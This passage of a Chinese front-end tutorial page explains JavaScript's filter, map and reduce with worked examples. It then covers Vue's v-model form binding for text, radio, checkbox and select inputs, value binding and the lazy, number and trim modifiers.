class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.需求: 取出所有小于100的数字</span></span><br><span class="line"><span class="keyword">let</span> newNums = []</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> nums) &#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    newNums.<span class="title function_">push</span>(n)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newNums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.需求:将所有小于100的数字进行转化: 全部*2</span></span><br><span class="line"><span class="keyword">let</span> new2Nums = []</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> newNums) &#123;</span><br><span class="line">  new2Nums.<span class="title function_">push</span>(n * <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new2Nums);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.需求:将所有new2Nums数字相加,得到最终的记过</span></span><br><span class="line"><span class="keyword">let</span> total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> new2Nums) &#123;</span><br><span class="line">  total += n</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);</span><br></pre></td></tr></table></figure><p>使用高阶函数的方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nums = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">111</span>, <span class="number">222</span>, <span class="number">444</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.filter函数的使用</span></span><br><span class="line"><span class="comment">// 10, 20, 40, 50</span></span><br><span class="line"><span class="keyword">let</span> newNums = nums.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> n &lt; <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newNums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.map函数的使用</span></span><br><span class="line"><span class="comment">// 20, 40, 80, 100</span></span><br><span class="line"><span class="keyword">let</span> new2Nums = newNums.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123; </span><br><span class="line">  <span class="keyword">return</span> n * <span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new2Nums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.reduce函数的使用</span></span><br><span class="line"><span class="comment">// reduce作用对数组中所有的内容进行汇总</span></span><br><span class="line"><span class="keyword">let</span> total = new2Nums.<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">preValue, n</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> preValue + n</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);</span><br><span class="line"><span class="comment">// 第一次: preValue=0 n=20，函数的第二个参数就是为preValue赋初始值</span></span><br><span class="line"><span class="comment">// 第二次: preValue=20 n=40</span></span><br><span class="line"><span class="comment">// 第二次: preValue=60 n=80</span></span><br><span class="line"><span class="comment">// 第二次: preValue=140 n=100</span></span><br><span class="line"><span class="comment">// 240</span></span><br></pre></td></tr></table></figure><p>高阶函数更简洁的方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nums = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">111</span>, <span class="number">222</span>, <span class="number">444</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> total = nums.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n &lt; <span class="number">100</span></span><br><span class="line">&#125;).<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n * <span class="number">2</span></span><br><span class="line">&#125;).<span class="title function_">reduce</span>(<span class="keyword">function</span> (<span class="params">prevValue, n</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> prevValue + n</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> total = nums.<span class="title function_">filter</span>(<span class="function"><span class="params">n</span> =&gt;</span> n &lt; <span class="number">100</span>).<span class="title function_">map</span>(<span class="function"><span class="params">n</span> =&gt;</span> n * <span class="number">2</span>).<span class="title function_">reduce</span>(<span class="function">(<span class="params">pre, n</span>) =&gt;</span> pre + n);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);</span><br></pre></td></tr></table></figure><h1 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h1><h2 id="表单绑定v-model"><a href="#表单绑定v-model" class="headerlink" title="表单绑定v-model"></a>表单绑定v-model</h2><p>表单控件在实际开发中是非常常见的。特别是对于用户信息的提交，需要大量的表单。</p><p>Vue中使用v-model指令来实现表单元素和数据的<strong>双向绑定</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>案例的解析：</p><p>当我们在输入框输入内容时，因为input中的v-model绑定了message，所以会实时将输入的内容传递给message，message发生改变。</p><p>当message发生改变时，因为上面我们使用Mustache语法，将message的值插入到DOM中，所以DOM会发生相应的改变。所以，通过v-model实现了双向的绑定。</p><p>当然，我们也可以将v-model用于textarea元素</p><h2 id="v-model原理"><a href="#v-model原理" class="headerlink" title="v-model原理"></a>v-model原理</h2><p>v-model其实是一个语法糖，它的背后本质上是包含两个操作：</p><ol><li>v-bind绑定一个value属性</li><li>v-on指令给当前元素绑定input事件<br>也就是说下面的代码：等同于下面的代码：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">等同于</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-bind:value</span>=<span class="string">&quot;message&quot;</span> <span class="attr">v-on:input</span>=<span class="string">&quot;message = $event.target.value&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model：radio"><a href="#v-model：radio" class="headerlink" title="v-model：radio"></a>v-model：radio</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>男</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>女</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的性别是: &#123;&#123;sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model：checkbox"><a href="#v-model：checkbox" class="headerlink" title="v-model：checkbox"></a>v-model：checkbox</h2><p>复选框分为两种情况：单个勾选框和多个勾选框</p><p>单个勾选框：v-model即为布尔值。此时input的value并不影响v-model的值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;protocol&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;protocol&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;isAgree&quot;</span>&gt;</span>同意协议</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的是: &#123;&#123;isAgree&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">:disabled</span>=<span class="string">&quot;!isAgree&quot;</span>&gt;</span>下一步<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="attr">isAgree</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多个复选框：当是多个复选框时，因为可以选中多个，所以对应的data中属性是一个数组。每选中某一个，就会将input的value添加到数组中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;篮球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>篮球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;足球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>足球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;乒乓球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>乒乓球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;羽毛球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>羽毛球</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您的爱好是: &#123;&#123;hobbies&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">hobbies</span>: []</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model：select"><a href="#v-model：select" class="headerlink" title="v-model：select"></a>v-model：select</h2><p>和checkbox一样，select也分单选和多选两种情况。</p><p>单选：只能选中一个值，v-model绑定的是一个值。当我们选中option中的一个时，会将它对应的value赋值到mySelect中</p><p>多选：可以选中多个值，v-model绑定的是一个数组。当选中多个值时，就会将选中的option对应的value添加到数组mySelects中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--1.选择一个--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;fruit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;苹果&quot;</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;香蕉&quot;</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;榴莲&quot;</span>&gt;</span>榴莲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;葡萄&quot;</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的水果是: &#123;&#123;fruit&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--2.选择多个--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;fruits&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;苹果&quot;</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;香蕉&quot;</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;榴莲&quot;</span>&gt;</span>榴莲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;葡萄&quot;</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您选择的水果是: &#123;&#123;fruits&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fruit</span>: <span class="string">&#x27;香蕉&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fruits</span>: []</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="值绑定"><a href="#值绑定" class="headerlink" title="值绑定"></a>值绑定</h2><p>官方文档仔细阅读之后，发现很简单，就是动态的给value赋值而已。</p><p>我们前面的value中的值，可以回头去看一下，都是在定义input的时候直接给定的。</p><p>但是真实开发中，这些input的值可能是从网络获取或定义在data中的。所以我们可以通过v-bind:value动态的给value绑定值。</p><p>其实会用v-bind，就会值绑定的应用了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">v-for</span>=<span class="string">&quot;item in originHobbies&quot;</span> <span class="attr">:for</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;item&quot;</span> <span class="attr">:id</span>=<span class="string">&quot;item&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>您的爱好是: &#123;&#123;hobbies&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">hobbies</span>: [], </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">originHobbies</span>: [<span class="string">&#x27;篮球&#x27;</span>, <span class="string">&#x27;足球&#x27;</span>, <span class="string">&#x27;乒乓球&#x27;</span>, <span class="string">&#x27;羽毛球&#x27;</span>, <span class="string">&#x27;台球&#x27;</span>, <span class="string">&#x27;高尔夫球&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ul><li>lazy修饰符：<ul><li>默认情况下，v-model是在input事件中同步输入框的数据的。</li><li>也就是说，一旦有数据发生改变对应的data中的数据就会自动发生改变。</li><li>lazy修饰符可以让数据在失去焦点（点击输入框的外面部分）或者回车时才会更新：</li></ul></li><li>number修饰符：<ul><li>默认情况下，在输入框中无论我们输入的是字母还是数字（type&#x3D;”number”也只有第一次输入是数字类型），都会被当做字符串类型进行处理。</li><li>但是如果我们希望处理的是数字类型，那么最好直接将内容当做数字处理。</li><li>number修饰符可以让在输入框中输入的内容自动转成数字类型：</li></ul></li><li>trim修饰符：<ul><li>如果输入的内容首尾有很多空格，通常我们希望将其去除</li><li>trim修饰符可以过滤内容左右两边的空格</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--1.修饰符: lazy--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--2.修饰符: number--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;age&#125;&#125;-&#123;&#123;typeof age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--3.修饰符: trim--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 